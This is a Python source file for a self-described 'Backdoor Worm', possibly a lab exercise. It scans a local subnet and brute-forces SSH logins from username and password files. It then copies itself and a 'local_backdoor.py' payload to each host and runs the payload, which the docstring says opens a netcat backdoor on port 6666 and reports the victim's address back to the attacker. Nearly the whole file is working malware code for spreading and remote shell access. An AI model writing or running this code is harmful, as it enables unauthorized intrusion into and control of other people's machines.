""" Backdoor Worm. Infects target system and sets up a netcat listener
    usage: python <worm.py> <local_attack.py> <marker_file> <username_file> <password_file>
    Backdoor port: 6666 (spooky)
    Utility used:  netcat
    Goal
        1. Report back to initial system each time a system is infected
        2. Provide initial system with access to a remote shell for each infection  """
import os
import sys
import argparse
from SSHConnection import SSHConnection
from SSHConnection import get_local_ip
from sys import executable
from subprocess import call
import time

def transfer_file(worm, malicious_file):
    """ Transfers a malicious file, must be in same directory as current script """
    sftp_client = worm.ssh_connection.open_sftp()
    sftp_client.chdir(worm.target_dir)
    sftp_client.put(malicious_file, malicious_file)
    sftp_client.chmod(malicious_file, 777)


def launch_attack(worm, malicious_file):
    """ Sends signal to program to call another python file that will do all the bad stuff locally
        so that the worm isn't stuck doing it all through ssh commands. """
    worm.ssh_connection.exec_command("python " + worm.target_dir + malicious_file +
                                     " " + worm.target_dir)

def main():
    """ Main function that does all the heavy lifting. Very similar to replicator """
    malicious_file = "local_backdoor.py"
    marker_file = "backdoor_marker.txt"
    # Grab files with usernames and passwords
    parser = argparse.ArgumentParser()
    parser.add_argument("usernames", nargs=1, help="File of usernames to try", type=str)
    parser.add_argument("passwords", nargs=1, help="File of passwords to try", type=str)
    args = parser.parse_args()

    worm = SSHConnection()
    # Consider changing this to allow files in other directories to be used ?
    username_file = os.path.basename(args.usernames[0])
    password_file = os.path.basename(args.passwords[0])
    worm.set_files([malicious_file, username_file, password_file])

    # Create worm instance and search first 10 ips on the network
    worm.retrieve_vulnerable_hosts("192.168.1.", 10)

    # Set the file the worm will look for on the target system
    worm.set_worm_file(marker_file)
    if worm.find_target_host():
        # ound an unmarked host, copy the iles over to it.
        worm.set_target_dir("/home/" + worm.username + "/")
        transfer_file(worm, malicious_file)
        transfer_file(worm, __file__)
        transfer_file(worm, "SSHConnection.py")
        transfer_file(worm, username_file)
        transfer_file(worm, password_file)
        print ("[+] Completed! Launching listener now...")
        worm.ssh_connection.exec_command("echo " + get_local_ip() + " >> " + marker_file)
        """
        Steps (Needs to be in this order)
        1. Start Listener on Attacker System to recieve IP of victim (currently never finishes as it closes when message is recieved. Message send code is never reached as listener never finishes)
        2. Launch attack opens sender, sends IP of victim to attacker, opens nohup netcap backdoor
        3. getvictipIP uses recieved to run netcat and control first victim thorugh shell
        """
        try:
            call(['lxterminal','-e','python control.py'])
        except Exception as nothostcomputer:
            pass
        print ("[+] Completed! Launching local attack now...")
        #time.sleep(10)
        launch_attack(worm, malicious_file)
    else:
        print (" :( No target found, better get a job! ")

if __name__ == "__main__":
    main()
